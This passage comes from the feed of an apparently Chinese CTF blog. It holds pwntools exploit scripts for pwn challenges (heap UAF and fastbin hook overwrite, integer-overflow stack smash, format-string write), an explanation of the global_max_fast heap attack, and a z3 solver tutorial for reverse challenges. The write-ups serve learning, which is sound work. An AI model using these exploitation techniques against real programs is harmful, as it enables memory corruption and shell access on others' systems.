class="line">mallochook=libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"></span><br><span class="line">one=libc.address+onegadgets[<span class="number">3</span>]</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(mallochook<span class="number">-0x23</span>))</span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#7</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(one))</span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p><h2 id="三學"><a href="#三學" class="headerlink" title="三學"></a>三學</h2><p>整数溢出造成栈溢出</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">r=process(<span class="string">'./pwn3'</span>)</span><br><span class="line"><span class="comment">#r=remote("0.0.0.0",10001)</span></span><br><span class="line">sys=<span class="number">0x8048440</span></span><br><span class="line">sh=<span class="number">0x804a04c</span></span><br><span class="line">r.recvuntil(<span class="string">':'</span>) <span class="comment">#name</span></span><br><span class="line">r.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">r.recvuntil(<span class="string">':'</span>) <span class="comment">#chose</span></span><br><span class="line">r.sendline(<span class="string">'1'</span>)</span><br><span class="line">r.recvuntil(<span class="string">':'</span>) <span class="comment">#size</span></span><br><span class="line">r.sendline(<span class="string">'-1'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'\n'</span>) <span class="comment">#content</span></span><br><span class="line">r.sendline(<span class="string">'a'</span>*<span class="number">0x5C</span>+p32(<span class="number">0xffffffff</span>)+p32(sys)+p32(<span class="number">0</span>)+p32(sh))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="四諦"><a href="#四諦" class="headerlink" title="四諦"></a>四諦</h2><p>堆中存在调用puts函数的函数指针,而且还通过堆块来调用函数</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">r= process(<span class="string">'./pwn4'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./pwn4'</span>)</span><br><span class="line">libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">got_puts=elf.got[<span class="string">'puts'</span>]</span><br><span class="line">info(<span class="string">'got_puts-&gt;'</span>+hex(got_puts))</span><br><span class="line">pause()</span><br><span class="line">func=<span class="number">0x80491f2</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">32</span>,<span class="string">"0"</span>*<span class="number">4</span>)<span class="comment">#0</span></span><br><span class="line">addnote(<span class="number">32</span>,<span class="string">"1"</span>*<span class="number">4</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>)</span><br><span class="line">delnote(<span class="number">1</span>)</span><br><span class="line">addnote(<span class="number">8</span>,p32(func)+p32(got_puts))<span class="comment">#2</span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">printnote(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">puts=u32(r.recv(<span class="number">4</span>))</span><br><span class="line">success(hex(puts))</span><br><span class="line">pause()</span><br><span class="line">libc.address=puts-libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">sys=libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">delnote(<span class="number">2</span>)</span><br><span class="line">addnote(<span class="number">8</span>,p32(sys)+<span class="string">';$0\x00'</span>)<span class="comment">#3</span></span><br><span class="line">printnote(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="五蘊"><a href="#五蘊" class="headerlink" title="五蘊"></a>五蘊</h2><p>格式化字符串漏洞，直接向unk_804c044写特定数，再输入相同的数，可用三种不同方法得到shell</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">r=process(<span class="string">'./pwn5'</span>)</span><br><span class="line"><span class="comment">#r=remote('0.0.0.0',10003)</span></span><br><span class="line">target=<span class="number">0x804c044</span></span><br><span class="line"><span class="comment">#pay=p32(target)+p32(target+1)+p32(target+2)+p32(target+3)+'%10$hhn%11$hhn%12$hhn%13$hhn'</span></span><br><span class="line"><span class="comment">#r.sendline(str(0x10101010))</span></span><br><span class="line">pay=p32(target)+<span class="string">'%012s'</span>+<span class="string">'%10$n'</span></span><br><span class="line">pay=p32(target)+<span class="string">'a'</span>*<span class="number">12</span>+<span class="string">'%10$n'</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">r.sendline(pay)</span><br><span class="line">r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">r.sendline(str(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;壹業&quot;&gt;&lt;a href=&quot;#壹業&quot; class=&quot;headerlink&quot; title=&quot;壹業&quot;&gt;&lt;/a&gt;壹業&lt;/h2&gt;&lt;p&gt;标准的UAF漏洞题&lt;/p&gt;
&lt;h3 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>global_max_fast相关利用</title>
    <link href="https://nocbtm.github.io/2019/10/04/global-max-fast%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8/"/>
    <id>https://nocbtm.github.io/2019/10/04/global-max-fast相关利用/</id>
    <published>2019-10-04T05:23:04.000Z</published>
    <updated>2019-10-04T10:57:14.066Z</updated>
    
    <content type="html"><![CDATA[<h2 id="global-max-fas"><a href="#global-max-fas" class="headerlink" title="global_max_fas"></a>global_max_fas</h2><p>global_max_fast这个全局变量的作用是用来标志fastbin的大小的阈值，小于这个值的堆块会被认为是fastbin，使用fastbin的相应机制进行管理。在glibc-2.23中看下它的定义：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_max_fast(s) \</span></span><br><span class="line">  global_max_fast = (((s) == <span class="number">0</span>)                           \</span><br><span class="line">                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line">#define get_max_fast() global_max_fast</span><br></pre></td></tr></table></figure></p><p>set_max_fast初始化函数开始是在malloc_init_state调用的，可以看到这个宏定义的作用是设置global_max_fast默认值，默认值是0x80。</p><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>改写global_max_fast为一个较大的值，然后释放一个较大的堆块时，由于fastbins数组空间是有限的，其相对偏移将会往后覆盖，如果释放堆块的size可控，就可实现往fastbins数组（main_arena）后的任意地址写入堆块的地址。</p><p>即利用global_max_fast进行相关的攻击</p><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>可结合<a href="https://wiki.x10sec.org/pwn/heap/unsorted_bin_attack/" target="_blank" rel="noopener">unsorted bin attack</a>来修改globa_max_fast为一个较大的值，前置条件是需要泄露libc的地址。<br>然后通过地址与fastbin数组的偏移计算出所需free的堆块的size，释放相应的堆块，即可实现往该地址写入堆块的地址以进一步利用。</p><p>计算偏移的代码可以如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fastbin_ptr=libc_base+libc.symbols[&apos;main_arena&apos;]+8</span><br><span class="line">idx=(target_addr-fastbin_ptr)/8</span><br><span class="line">size=idx*0x10+0x20</span><br></pre></td></tr></table></figure></p><p>此时要解决的事情是往哪里写以达到实现利用的目的。可能有很多的地方，理论上来说只要是main_arena结构体后面的是函数指针或是结构体指针的地址都可以，目前很容易能够预想到的是：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_list_all</span><br><span class="line"><span class="built_in">stdout</span></span><br><span class="line"><span class="built_in">stdin</span></span><br><span class="line"><span class="built_in">stderr</span></span><br><span class="line">__free_hook</span><br></pre></td></tr></table></figure></p><p>复写前面四个就是使用IO_file攻击那一套方法，伪造结构体来实现任意读任意写或者伪造vtable来实现house of orange攻击。</p><p>复写<strong>free_hook的话则需要一次uaf来修改释放进去的fd改成system或者one gadget，再将堆块申请出来，从而实现将</strong>free_hook改写成system或者one gadget。</p><h2 id="实例-starctf2019-heap-master"><a href="#实例-starctf2019-heap-master" class="headerlink" title="实例 starctf2019-heap_master"></a>实例 starctf2019-heap_master</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;global-max-fas&quot;&gt;&lt;a href=&quot;#global-max-fas&quot; class=&quot;headerlink&quot; title=&quot;global_max_fas&quot;&gt;&lt;/a&gt;global_max_fas&lt;/h2&gt;&lt;p&gt;global_max_fast这个全局变量的
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>z3求解器</title>
    <link href="https://nocbtm.github.io/2019/10/03/z3%E6%B1%82%E8%A7%A3%E5%99%A8/"/>
    <id>https://nocbtm.github.io/2019/10/03/z3求解器/</id>
    <published>2019-10-03T06:24:37.000Z</published>
    <updated>2019-10-03T07:45:00.146Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Z3是一个微软出品的开源约束求解器，能够解决很多种情况下的给定部分约束条件寻求一组满足条件的解的问题（可以简单理解为解方程的感觉，虽然这么比喻其实还差距甚远，请勿吐槽），功能强大且易于使用。<br>Z3 在工业应用中实际上常见于软件验证、程序分析等。然而由于功能实在强大，也被用于很多其他领域。CTF 领域来说，能够用约束求解器搞定的问题常见于密码题、二进制逆向、符号执行、Fuzzing 模糊测试等。此外，著名的二进制分析框架 angr 也内置了一个修改版的 Z3。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>这里我用的是angr里面的z3，<a href="https://nocbtm.github.io/2019/10/02/docker%E5%AE%89%E8%A3%85angr/">安装教程</a>。</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x = Int(<span class="string">'x'</span>)</span><br><span class="line">y = Int(<span class="string">'y'</span>)</span><br><span class="line">solve(x &gt; <span class="number">2</span>, y &lt; <span class="number">10</span>, x + <span class="number">2</span>*y == <span class="number">7</span>)</span><br></pre></td></tr></table></figure><p>上面的例子中，定义了两个变量：x 和 y。类型为 Int（注意这里的 Int 可不是 C/C++ 里面包含上下界的 int，Z3 中的 Int 对应的就是数学中的整数，Z3 中的 BitVector 才对应到 C/C++ 中的 int）。</p><p>然后就调用了 solve 函数求解三个条件下的满足模型，这三个条件分别是 x 大于 2，y 小于 10，并且 x 加 2 个 y 等于 7。</p><p>运行一下结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(angr) angr@36aeab92fea7:~/z3$ python test.py </span><br><span class="line">[y = 0, x = 7]</span><br></pre></td></tr></table></figure><h2 id="ctf实例"><a href="#ctf实例" class="headerlink" title="ctf实例"></a>ctf实例</h2><h3 id="某比赛中的逆向题"><a href="#某比赛中的逆向题" class="headerlink" title="某比赛中的逆向题"></a>某比赛中的逆向题</h3><p>首先我们利用IDA去打开该文件，定位到关键点，发现关键函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">sub_400766</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_6020A0) != <span class="number">32</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  v3 = stru_6020A0.y1;</span><br><span class="line">  v4 = stru_6020A0.y2;</span><br><span class="line">  v5 = stru_6020A0.y3;</span><br><span class="line">  v6 = stru_6020A0.y4;</span><br><span class="line">  <span class="keyword">if</span> ( stru_6020A0.x2 * (<span class="keyword">signed</span> __int64)stru_6020A0.x1 - stru_6020A0.x4 * (<span class="keyword">signed</span> __int64)stru_6020A0.x3 != <span class="number">0x24CDF2E7C953DA56</span>LL )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3L</span>L * stru_6020A0.x3 + <span class="number">4L</span>L * stru_6020A0.x4 - stru_6020A0.x2 - <span class="number">2L</span>L * stru_6020A0.x1 != <span class="number">0x17B85F06</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3</span> * stru_6020A0.x1 * (<span class="keyword">signed</span> __int64)stru_6020A0.x4 - stru_6020A0.x3 * (<span class="keyword">signed</span> __int64)stru_6020A0.x2 != <span class="number">0x2E6E497E6415CF3E</span>LL )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">27L</span>L * stru_6020A0.x2 + stru_6020A0.x1 - <span class="number">11L</span>L * stru_6020A0.x4 - stru_6020A0.x3 != <span class="number">0x95AE13337</span>LL )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  srand(stru_6020A0.x3 ^ stru_6020A0.x2 ^ stru_6020A0.x1 ^ stru_6020A0.x4);</span><br><span class="line">  v1 = rand() % <span class="number">50</span>;</span><br><span class="line">  v2 = rand() % <span class="number">50</span>;</span><br><span class="line">  v7 = rand() % <span class="number">50</span>;</span><br><span class="line">  v8 = rand() % <span class="number">50</span>;</span><br><span class="line">  v9 = rand() % <span class="number">50</span>;</span><br><span class="line">  v10 = rand() % <span class="number">50</span>;</span><br><span class="line">  v11 = rand() % <span class="number">50</span>;</span><br><span class="line">  v12 = rand() % <span class="number">50</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v6 * v2 + v3 * v1 - v4 - v5 != <span class="number">0xE638C96D3</span>LL</span><br><span class="line">    || v6 + v3 + v5 * v8 - v4 * v7 != <span class="number">0xB59F2D0CB</span>LL</span><br><span class="line">    || v3 * v9 + v4 * v10 - v5 - v6 != <span class="number">0xDCFE88C6D</span>LL</span><br><span class="line">    || v5 * v12 + v3 - v4 - v6 * v11 != <span class="number">0xC076D98BB</span>LL )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_15:</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看得出来这个题目的目的就是找出满足方程的flag。我们可以很方便的把方程式列出来，但是求解对于一些数学不是很好的人来说简直就是噩梦，这时候Z3求解器就可以很方便的给我们帮助。我们按照题目的意思一步一步利用Z3求解器来求解：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">x1 = Int(<span class="string">'x1'</span>)</span><br><span class="line">x2 = Int(<span class="string">'x2'</span>)</span><br><span class="line">x3 = Int(<span class="string">'x3'</span>)</span><br><span class="line">x4 = Int(<span class="string">'x4'</span>)</span><br><span class="line">s = Solver()  <span class="comment">#创建一个通用求解器</span></span><br><span class="line">s.add( x2*x1-x4*x3 == <span class="number">0x24CDF2E7C953DA56</span>)  <span class="comment">#添加约束条件</span></span><br><span class="line">s.add( <span class="number">3</span>*x3+<span class="number">4</span>*x4-x2<span class="number">-2</span>*x1 == <span class="number">0x17B85F06</span>)</span><br><span class="line">s.add( <span class="number">3</span>*x1*x4-x3*x2 == <span class="number">0x2E6E497E6415CF3E</span>)</span><br><span class="line">s.add( <span class="number">27</span>*x2+x1<span class="number">-11</span>*x4 - x3 == <span class="number">0x95AE13337</span>)</span><br><span class="line"><span class="keyword">print</span> s.check()   <span class="comment">#检查是否有解，sat结果表示找到某个合适的解，unsat结果表示没有解</span></span><br><span class="line">m = s.model()    <span class="comment">#得到一组解，m为字典类型</span></span><br><span class="line"><span class="keyword">print</span> m</span><br><span class="line"><span class="keyword">print</span> <span class="string">"traversing model..."</span></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> m.decls():</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%s = %s"</span> % (d.name(), m[d])</span><br></pre></td></tr></table></figure></p><h3 id="第八届极客大挑战的REConvolution"><a href="#第八届极客大挑战的REConvolution" class="headerlink" title="第八届极客大挑战的REConvolution"></a>第八届极客大挑战的REConvolution</h3><p>我们打开文件，也是比较直观的看到约束条件，我试着逆向了这个过程，花费了挺多的时间才得到答案，但是如果我们使用Z3Py来求解的话就会非常的快。</p><p>函数关键部分如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> ii; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// kr00_4</span></span><br><span class="line">  <span class="keyword">char</span> flag_i; <span class="comment">// bl</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> jj; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> xor_result[<span class="number">80</span>]; <span class="comment">// [esp+8h] [ebp-A4h]</span></span><br><span class="line">  <span class="keyword">char</span> flag[<span class="number">80</span>]; <span class="comment">// [esp+58h] [ebp-54h]</span></span><br><span class="line">  sub_DC1020(<span class="string">"Please input your flag: "</span>);</span><br><span class="line">  sub_DC1050(<span class="string">"%40s"</span>, flag);</span><br><span class="line">  <span class="built_in">memset</span>(xor_result, <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">  ii = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(flag);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      flag_i = flag[ii];</span><br><span class="line">      jj = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 = &amp;xor_result[jj + ii];</span><br><span class="line">        v8 = flag_i ^ data1[jj++];</span><br><span class="line">        *v7 += v8;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( jj &lt; <span class="number">0x20</span> );</span><br><span class="line">      ++ii;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( ii &lt; v4 );</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = <span class="built_in">strcmp</span>(xor_result, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;data2);</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">    v9 = -(v9 &lt; <span class="number">0</span>) | <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No, it isn't."</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Yes, it is."</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们利用Z3Py来进行变量的声明和约束的增加并进行求解<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python2</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line">X =  [BitVec((<span class="string">'x%s'</span> % i),<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x22</span>) ]   <span class="comment">#生成34个8比特的数</span></span><br><span class="line"><span class="keyword">print</span> X</span><br><span class="line">data1 =  [<span class="number">0x21</span>,<span class="number">0x22</span>,<span class="number">0x23</span>,<span class="number">0x24</span>,<span class="number">0x25</span>,<span class="number">0x26</span>,<span class="number">0x27</span>,<span class="number">0x28</span>,<span class="number">0x29</span>,<span class="number">0x2A</span>,<span class="number">0x2B</span>,<span class="number">0x2C</span>,<span class="number">0x2D</span>,<span class="number">0x2E</span>,<span class="number">0x2F</span>,<span class="number">0x3A</span>,</span><br><span class="line"><span class="number">0x3B</span>,<span class="number">0x3C</span>,<span class="number">0x3D</span>,<span class="number">0x3E</span>,<span class="number">0x3F</span>,<span class="number">0x40</span>,<span class="number">0x5B</span>,<span class="number">0x5C</span>,<span class="number">0x5D</span>,<span class="number">0x5E</span>,<span class="number">0x5F</span>,<span class="number">0x60</span>,<span class="number">0x7B</span>,<span class="number">0x7C</span>,<span class="number">0x7D</span>,<span class="number">0x7E</span>]</span><br><span class="line">data2 = [<span class="number">0x72</span>,<span class="number">0xE9</span>,<span class="number">0x4D</span>,<span class="number">0xAC</span>,<span class="number">0xC1</span>,<span class="number">0xD0</span>,<span class="number">0x24</span>,<span class="number">0x6B</span>,<span class="number">0xB2</span>,<span class="number">0xF5</span>,<span class="number">0xFD</span>,<span class="number">0x45</span>,<span class="number">0x49</span>,<span class="number">0x94</span>,<span class="number">0xDC</span>,<span class="number">0x10</span>,</span><br><span class="line"><span class="number">0x10</span>,<span class="number">0x6B</span>,<span class="number">0xA3</span>,<span class="number">0xFB</span>,<span class="number">0x5C</span>,<span class="number">0x13</span>,<span class="number">0x17</span>,<span class="number">0xE4</span>,<span class="number">0x67</span>,<span 